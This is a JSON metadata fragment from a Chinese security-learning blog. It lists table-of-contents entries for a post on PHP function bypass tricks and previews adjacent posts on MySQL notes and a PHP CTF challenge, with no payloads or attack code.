href=\"#4-intval-%E5%87%BD%E6%95%B0\"><span class=\"toc-text\">4.intval()函数</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#5-strpos-%E5%87%BD%E6%95%B0\"><span class=\"toc-text\">5.strpos()函数</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#6-in-array-%E5%87%BD%E6%95%B0\"><span class=\"toc-text\">6.in_array()函数</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#7-preg-match-%E5%87%BD%E6%95%B0\"><span class=\"toc-text\">7.preg_match()函数</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#8-str-replace%E5%87%BD%E6%95%B0\"><span class=\"toc-text\">8.str_replace函数</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#9-json%E7%BB%95%E8%BF%87\"><span class=\"toc-text\">9.json绕过</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#10-array-search%E7%9A%84%E6%BC%8F%E6%B4%9E\"><span class=\"toc-text\">10.array_search的漏洞</span></a></li></ol></li></ol>","author":{"name":"Abyssaler","slug":"blog-author","avatar":"https://pic.kts.g.mi.com/551ced5839599747048c3c99a9d47df4203311636470612235.jpg","link":"/","description":"道阻且长，行则将至","socials":{"github":"https://github.com/Abyssaler","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"https://blog.csdn.net/weixin_45349299","juejin":"","customs":{}}},"mapped":true,"prev_post":{"title":"MYSQL在线笔记2","uid":"ed24fbd407825b2a3a3f1a7f074c200e","slug":"MySQL2","date":"2022-11-21T15:08:12.380Z","updated":"2022-11-21T16:04:14.478Z","comments":true,"path":"api/articles/MySQL2.json","keywords":null,"cover":"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typorab39772daca5448d7a16eb2f2b554030a.png","text":"基础篇通用语法及分类 DDL: 数据定义语言，用来定义数据库对象（数据库、表、字段） DML: 数据操作语言，用来对数据库表中的数据进行增删改 DQL: 数据查询语言，用来查询数据库中表的记录 DCL: 数据控制语言，用来创建数据库用户、控制数据库的控制权限 DDL（数据定义语言...","link":"","photos":[],"count_time":{"symbolsCount":"33k","symbolsTime":"30 mins."},"categories":[{"name":"在线笔记","slug":"在线笔记","count":2,"path":"api/categories/在线笔记.json"}],"tags":[{"name":"mysql","slug":"mysql","count":2,"path":"api/tags/mysql.json"}],"author":{"name":"Abyssaler","slug":"blog-author","avatar":"https://pic.kts.g.mi.com/551ced5839599747048c3c99a9d47df4203311636470612235.jpg","link":"/","description":"道阻且长，行则将至","socials":{"github":"https://github.com/Abyssaler","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"https://blog.csdn.net/weixin_45349299","juejin":"","customs":{}}}},"next_post":{"title":"ctf笔记之wake_php","uid":"1a613abcdf9c626b905ba0d768be1622","slug":"ctf之wake_php","date":"2022-11-19T17:17:07.600Z","updated":"2022-11-20T04:47:40.791Z","comments":true,"path":"api/articles/ctf之wake_php.json","keywords":null,"cover":"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typorawallhaven-5wm9o7_1920x1080.png","text":"源码： &lt;?php highlight_file(__FILE__); include(&quot;password.php&quot;); if(isset($_POST[&#39;password&#39;])) &#123; if(strcmp($_POST[&#39...","link":"","photos":[],"count_time":{"symbolsCount":"4.5k","symbolsTime":"4 mins."},"categories":[{"name":"学习笔记","slug":"学习笔记","count":12,"path":"api/categories/学习笔记.json"}],"tags":[{"name":"php","slug":"php","count":8,"path":"api/tags/php.json"},{"name":"ctf","slug":"ctf","count":2,"path":"api/tags/ctf.json"}],"author":{"name":"Abyssaler","slug":"blog-author","avatar":"https://pic.kts.g.mi.com/551ced5839599747048c3c99a9d47df4203311636470612235.jpg","link":"/","description":"道阻且长，行则将至","socials":{"github":"https://github.com/Abyssaler","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"https://blog.csdn.net/weixin_45349299","juejin":"","customs":{}}}}}